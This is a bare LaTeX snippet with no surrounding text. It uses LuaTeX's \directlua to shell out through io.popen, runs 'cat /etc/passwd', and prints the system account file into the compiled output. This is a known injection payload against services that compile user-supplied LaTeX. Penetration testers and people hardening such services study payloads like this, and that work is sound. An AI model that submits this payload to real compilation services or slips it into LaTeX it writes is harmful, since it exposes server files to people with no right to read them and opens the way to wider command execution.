\directlua{
tex.print(io.popen("cat /etc/passwd"):read("*a"))
}
